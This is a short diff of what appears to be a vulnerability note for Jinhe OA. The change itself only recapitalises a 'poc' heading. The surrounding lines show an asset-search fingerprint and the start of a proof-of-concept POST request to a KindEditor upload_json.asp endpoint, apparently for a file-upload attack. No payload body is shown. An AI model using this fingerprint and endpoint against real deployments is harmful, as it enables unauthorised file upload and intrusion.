@@ -8,7 +8,7 @@
 app="金和网络-金和OA"
 ```
 
-## poc
+## POC
 ```
 POST /c6/KindEditor1/asp/upload_json.asp?dir=file HTTP/1.1
 Host: your_ip
